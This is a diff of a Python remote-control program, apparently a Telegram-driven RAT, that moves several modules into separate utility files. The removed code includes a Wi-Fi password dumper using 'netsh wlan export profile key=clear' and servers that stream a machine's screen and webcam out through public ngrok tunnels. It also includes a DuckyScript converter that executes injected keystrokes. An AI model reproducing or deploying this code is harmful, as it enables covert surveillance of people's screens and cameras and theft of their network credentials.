@@ -34,9 +34,6 @@ from moviepy.editor import AudioFileClip, VideoFileClip
 #AUDIO
 import soundfile as sf
 import sounddevice as sd
-from comtypes import CLSCTX_ALL
-from ctypes import cast, POINTER
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 try:
     from winsound import PlaySound, SND_FILENAME, SND_ASYNC
@@ -50,13 +47,13 @@ import json
 import ctypes
 import psutil
 import socket
+import inspect
 import traceback
 from io import BytesIO
 import pyautogui as pg
 import subprocess as sp
 from shutil import copy2
 from re import findall, M
-from xml.dom import minidom
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
@@ -71,13 +68,12 @@ from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, r
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, split as pathsplit, getsize
 
-#TUNNEL HANDLING
-import pyngrok.process
-from pyngrok import ngrok
-from http.server import HTTPServer
-from socketserver import ThreadingMixIn
-from http.server import BaseHTTPRequestHandler, HTTPServer
-
+#UTILS
+import pyngrok
+from utils.tunnel_handler import *
+from utils.duckyscript import toducky
+from utils.mymixer import CustomMixer
+from utils.wifidumper import WifiDumper
 
 def resource_path(relative_path: str) -> str:
     if getattr(sys, 'frozen', False):
@@ -176,10 +172,10 @@ emoji_dict = {
 }
 
 try:
-    vfx = resource_path("vfx")
-    sfx = resource_path("sfx")
-    prototxt_filename = resource_path(join("model","1.prototxt"))
-    caffemodel_filename = resource_path(join("model","2.caffemodel"))
+    vfx = resource_path(join("assets", "vfx"))
+    sfx = resource_path(join("assets", "sfx"))
+    prototxt_filename = resource_path(join("assets","model","1.prototxt"))
+    caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
 except Exception as e:
     print(e)
     exit()
@@ -450,11 +446,29 @@ def get_current_wallpaper():
     path = buffer.value
     return path if isfile(path) else None
 
-def get_function_parameters(function: callable) -> list[str]:
-    return function.__code__.co_varnames[:function.__code__.co_argcount]
+def get_function_parameters(func):
+    sig = inspect.signature(func)
+    params = []
+    for name, param in sig.parameters.items():
+        if param.kind == inspect.Parameter.VAR_POSITIONAL:
+            params.append(f'*{name}')
+        elif param.kind == inspect.Parameter.VAR_KEYWORD:
+            params.append(f'**{name}')
+        else:
+            params.append(name)
+    return params
 
 def get_required_params(func):
-    return func.__code__.co_varnames[:func.__code__.co_argcount][:func.__code__.co_argcount - len(func.__defaults__ or ())]
+    sig = inspect.signature(func)
+    return [
+        name for name, param in sig.parameters.items()
+        if param.default == inspect.Parameter.empty
+        and param.kind in (
+            inspect.Parameter.POSITIONAL_ONLY,
+            inspect.Parameter.POSITIONAL_OR_KEYWORD,
+            inspect.Parameter.KEYWORD_ONLY
+        )
+    ]
 
 def backup_wallpaper(backup_path):
     current_wallpaper = get_current_wallpaper()
@@ -509,357 +523,6 @@ def terminate_process_by_name(process_name: str) -> None:
         if proc.name().lower() == process_name.lower().strip():
                 proc.terminate()
 
-"""
-oooooooooo.                         oooo                     .oooooo..o                     o8o                 .   
-`888'   `Y8b                        `888                    d8P'    `Y8                     `"'               .o8   
- 888      888 oooo  oooo   .ooooo.   888  oooo  oooo    ooo Y88bo.       .ooooo.  oooo d8b oooo  oo.ooooo.  .o888oo 
- 888      888 `888  `888  d88' `"Y8  888 .8P'    `88.  .8'   `"Y8888o.  d88' `"Y8 `888""8P `888   888' `88b   888   
- 888      888  888   888  888        888888.      `88..8'        `"Y88b 888        888      888   888   888   888   
- 888     d88'  888   888  888   .o8  888 `88b.     `888'    oo     .d8P 888   .o8  888      888   888   888   888 . 
-o888bood8P'    `V88V"V8P' `Y8bod8P' o888o o888o     .8'     8""88888P'  `Y8bod8P' d888b    o888o  888bod8P'   "888" 
-                                                .o..P'                                            888
-                                                `Y8P'                                            o888o
-"""
-
-#actually some parts are missing since this function has been made in ~2020
-def toducky(payload, execute=False) -> str:
-    print(f"toducky: {payload}")
-    duckyScript = [x.strip() for x in payload.split("\n")]
-    final = ""
-    defaultDelay = 0
-    if duckyScript[0][:7] == "DEFAULT":
-        defaultDelay = int(duckyScript[0][:13]) / 1000
-    previousStatement = ""
-    duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
-                     "LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
-                     "ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE", 
-                     "TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
-                     " u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
-                     " Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
-    pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down",
-                         "left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end",
-                         "esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space",
-                         "tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
-                         "u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
-                         "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
-    for line in duckyScript:
-        if line[0:3] == "REM":
-            previousStatement = line.replace("REM", "#")
-        elif line[0:5] == "DELAY":
-            previousStatement = "sleep(" + str(float(line[6:]) / 1000) + ")"
-        elif line[0:6] == "STRING":
-            previousStatement = "pg.typewrite(\"" + line[7:] + "\", interval=0.02)"
-        elif line[0:6] == "REPEAT":
-            for i in range(int(line[7:]) - 1):
-                final += previousStatement
-                final += "\n"
-        else:
-            previousStatement = "pg.hotkey("
-            for j in range(len(pyautoguiCommands)):
-                if line.find(duckyCommands[j]) != -1:
-                    previousStatement = previousStatement + "\'" + pyautoguiCommands[j] + "\',"
-            previousStatement = previousStatement[:-1] + ")"
-        if defaultDelay != 0:
-            previousStatement = "sleep(" + str(defaultDelay) + ")"
-        final += previousStatement
-        final += "\n"
-
-    final = final.replace("pg.hotkey)\n", "")
-    if execute:
-        exec(final)
-    return final
-
-"""
-TunnelHandling
-ooooooooooooo                                               oooo  ooooo   ooooo                             .o8  oooo   o8o
-8'   888   `8                                               `888  `888'   `888'                            "888  `888   `"'
-     888      oooo  oooo  ooo. .oo.   ooo. .oo.    .ooooo.   888   888     888   .oooo.   ooo. .oo.    .oooo888   888  oooo  ooo. .oo.    .oooooooo
-     888      `888  `888  `888P"Y88b  `888P"Y88b  d88' `88b  888   888ooooo888  `P  )88b  `888P"Y88b  d88' `888   888  `888  `888P"Y88b  888' `88b
-     888       888   888   888   888   888   888  888ooo888  888   888     888   .oP"888   888   888  888   888   888   888   888   888  888   888
-     888       888   888   888   888   888   888  888    .o  888   888     888  d8(  888   888   888  888   888   888   888   888   888  `88bod8P'
-    o888o      `V88V"V8P' o888o o888o o888o o888o `Y8bod8P' o888o o888o   o888o `Y888""8o o888o o888o `Y8bod88P" o888o o888o o888o o888o `8oooooo.
-                                                                                                                                         d"     YD
-                                                                                                                                         "Y88888P'
-"""
-class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-    daemon_threads = True
-    def handle_error(self, request, client_address):
-        pass
-
-class ScreenStreamHandler(BaseHTTPRequestHandler):
-    def log_message(self, format, *args):
-        pass
-
-    def do_GET(self):
-        if self.path == '/':
-            html = b"""\
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Screen Stream</title>
-                <style>
-                    body {
-                        background-color: #1e1e1e;
-                        color: #eee;
-                        font-family: sans-serif;
-                        text-align: center;
-                        padding-top: 30px;
-                    }
-                    img {
-                        border: 4px solid #444;
-                        border-radius: 10px;
-                        width: 80%%;
-                        max-width: 900px;
-                        box-shadow: 0 0 15px #000;
-                    }
-                </style>
-            </head>
-            <body>
-                <h1>Live Screen Stream</h1>
-                <img src="/video" alt="Screen stream">
-            </body>
-            </html>
-            """
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.send_header('Content-length', str(len(html)))
-            self.end_headers()
-            self.wfile.write(html)
-
-        elif self.path == '/video':
-            self.send_response(200)
-            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
-            self.end_headers()
-            try:
-                while True:
-                    screenshot = pg.screenshot()
-                    with BytesIO() as output:
-                        screenshot.save(output, format="JPEG")
-                        frame = output.getvalue()
-                    self.wfile.write(b"--frame\r\n")
-                    self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
-            except (BrokenPipeError, ConnectionResetError):
-                pass
-
-        else:
-            self.send_error(404)
-
-def webcamandscreenstreamhandlermaker(cap):
-    class WebcamAndScreenStreamHandler(BaseHTTPRequestHandler):
-        def log_message(self, format, *args):
-            pass
-
-        def do_GET(self):
-            if self.path == '/':
-                html = b"""\
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Webcam&Screen Stream</title>
-                    <style>
-                        body {
-                            background-color: #000;
-                            color: #fff;
-                            font-family: sans-serif;
-                            text-align: center;
-                            margin: 0;
-                            padding: 2em;
-                        }
-                        img {
-                            border: 6px solid #444;
-                            border-radius: 12px;
-                            width: 80%%;
-                            max-width: 960px;
-                            box-shadow: 0 0 20px #000;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h1>Live Webcam&Screen Stream</h1>
-                    <img src="/video" alt="Webcam stream">
-                </body>
-                </html>
-                """
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.send_header('Content-length', str(len(html)))
-                self.end_headers()
-                self.wfile.write(html)
-
-            elif self.path == '/video':
-                cap.open(0)
-                self.send_response(200)
-                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
-                self.end_headers()
-                try:
-                    while cap.isOpened():
-                        img = pg.screenshot()
-                        img = np.array(img)
-                        img = cvtColor(img, COLOR_BGR2RGB)
-                        ret, frame = cap.read()
-                        fr_height, fr_width, _ = frame.shape
-                        frame = resize(frame, (fr_width//2, fr_height//2))
-                        fr_height, fr_width, _ = frame.shape
-                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
-                        if not ret:
-                            continue
-                        _, jpeg = imencode('.jpg', img)
-                        self.wfile.write(b"--frame\r\n")
-                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
-                except (BrokenPipeError, ConnectionResetError):
-                    pass
-            else:
-                self.send_error(404)
-    return WebcamAndScreenStreamHandler
-
-def webcamstreamhandlermaker(cap):
-    class WebcamStreamHandler(BaseHTTPRequestHandler):
-        def log_message(self, format, *args):
-            pass
-
-        def do_GET(self):
-            if self.path == '/':
-                html = b"""\
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Webcam Stream</title>
-                    <style>
-                        body {
-                            background-color: #000;
-                            color: #fff;
-                            font-family: sans-serif;
-                            text-align: center;
-                            margin: 0;
-                            padding: 2em;
-                        }
-                        img {
-                            border: 6px solid #444;
-                            border-radius: 12px;
-                            width: 80%%;
-                            max-width: 960px;
-                            box-shadow: 0 0 20px #000;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h1>Live Webcam Stream</h1>
-                    <img src="/video" alt="Webcam stream">
-                </body>
-                </html>
-                """
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.send_header('Content-length', str(len(html)))
-                self.end_headers()
-                self.wfile.write(html)
-            elif self.path == '/video':
-                cap.open(0)
-                self.send_response(200)
-                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
-                self.end_headers()
-                try:
-                    while cap.isOpened():
-                        ret, frame = cap.read()
-                        if not ret:
-                            continue
-                        _, jpeg = imencode('.jpg', frame)
-                        self.wfile.write(b"--frame\r\n")
-                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
-                except (BrokenPipeError, ConnectionResetError):
-                    pass
-            else:
-                self.send_error(404)
-    return WebcamStreamHandler
-
-
-class MJPEGServer:
-    def __init__(self, port=8081, handler=None):
-        self.port = port
-        self.handler = handler
-        self.server = None
-        self.tunnel = None
-
-    def start(self):
-        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), self.handler)
-        Thread(target=self.server.serve_forever, daemon=True).start()
-        self.tunnel = ngrok.connect(self.port, "http")
-        return self.tunnel.public_url
-
-    def stop(self):
-        if self.tunnel:
-            ngrok.disconnect(self.tunnel.public_url)
-        if self.server:
-            self.server.shutdown()
-class TunnelManager:
-    def __init__(self):
-        self.services = {}
-
-    def start_screen_stream(self, name="screen", port=8081):
-        server = MJPEGServer(port, ScreenStreamHandler)
-        url = server.start()
-        self.services[name] = server
-        return url
-
-    def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
-        server = MJPEGServer(port, webcamstreamhandlermaker(cap))
-        url = server.start()
-        self.services[name] = server
-        return url
-
-    def start_webcam_and_screen_stream(self, name="webcamandscreen", port=8023, cap=VideoCapture(0)):
-        server = MJPEGServer(port, webcamandscreenstreamhandlermaker(cap))
-        url = server.start()
-        self.services[name] = server
-        return url
-
-    def stop_service(self, name):
-        if name in self.services:
-            self.services[name].stop()
-            del self.services[name]
-            return True
-        return False
-
-    def list_services(self):
-        return list(self.services.keys())
-
-
-"""
-oooooo   oooooo     oooo  o8o   .o88o.  o8o  oooooooooo.
- `888.    `888.     .8'   `"'   888 `"  `"'  `888'   `Y8b
-  `888.   .8888.   .8'   oooo  o888oo  oooo   888      888 oooo  oooo  ooo. .oo.  .oo.   oo.ooooo.   .ooooo.  oooo d8b 
-   `888  .8'`888. .8'    `888   888    `888   888      888 `888  `888  `888P"Y88bP"Y88b   888' `88b d88' `88b `888""8P 
-    `888.8'  `888.8'      888   888     888   888      888  888   888   888   888   888   888   888 888ooo888  888     
-     `888'    `888'       888   888     888   888     d88'  888   888   888   888   888   888   888 888    .o  888     
-      `8'      `8'       o888o o888o   o888o o888bood8P'    `V88V"V8P' o888o o888o o888o  888bod8P' `Y8bod8P' d888b    
-                                                                                          888
-                                                                                         o888o
-"""
-class WifiDumper:
-    def __init__(self) -> None:
-        pass
-
-    def extract_all(self) -> dict[str:str]:
-        sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
-        xmls = []
-        wifis = {} 
-        for file in listdir():
-            if file.endswith(".xml") and file.startswith("Wi-Fi"):
-                xmls.append(file)
-
-        for xml in xmls:
-            file = minidom.parse(xml)
-            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
-            name = file.getElementsByTagName("name")[0].firstChild.data
-
-            wifis.update({name:psw})
-
-        for file in xmls:
-            remove(file)
-        return wifis
-
-    def __str__(self) -> str:
-        return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])
 
 """
 oooooooooo.                  .       .                                  ooo        ooooo
@@ -1122,38 +785,6 @@ class LoadingBar:
         self.update()
 
 
-
-"""
-ooo        ooooo             ooo        ooooo  o8o
-`88.       .888'             `88.       .888'  `"'
- 888b     d'888  oooo    ooo  888b     d'888  oooo  oooo    ooo  .ooooo.  oooo d8b 
- 8 Y88. .P  888   `88.  .8'   8 Y88. .P  888  `888   `88b..8P'  d88' `88b `888""8P 
- 8  `888'   888    `88..8'    8  `888'   888   888     Y888'    888ooo888  888     
- 8    Y     888     `888'     8    Y     888   888   .o8"'88b   888    .o  888     
-o8o        o888o     .8'     o8o        o888o o888o o88'   888o `Y8bod8P' d888b    
-                 .o..P'
-                 `Y8P'
-"""
-class CustomMixer:
-    def __init__(self) -> None:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        self.volume = cast(interface, POINTER(IAudioEndpointVolume))
-    
-    def setVolumePercentage(self, percentage: int|float) -> None:
-        percentage = float(percentage)
-        if percentage in range(0, 101):
-            self.volume.SetMasterVolumeLevelScalar(percentage/100, None) 
-    
-    def getVolumePercentage(self) -> int:
-        current_volume = round(self.volume.GetMasterVolumeLevelScalar()*100)
-        return current_volume
-
-    def mute(self) -> None:
-        self.setVolumePercentage(0)
-
-    def full(self) -> None:
-        self.setVolumePercentage(100)
 
 
 """
@@ -1917,7 +1548,10 @@ class PeppinoTelegram:
                 if func in self.no_background_functions:
                     func(*function_args)
                 else:
-                    if len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args):
+                    skip_len = False
+                    if "*args" in function_all_args:
+                        skip_len = True
+                    if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
                         raise TypeError("Wrong number of arguments for this function")
                     if function_args:
                         thread_args = (*function_args,)
@@ -1926,7 +1560,6 @@ class PeppinoTelegram:
                         new_thread = Thread(target=func)
                     new_thread.start()
             except TypeError as e:
-                #self.bsend(f"Invalid args for function {command}\n{e}")
                 args = {} 
                 for arg in function_needed_args:
                     if arg == "self":
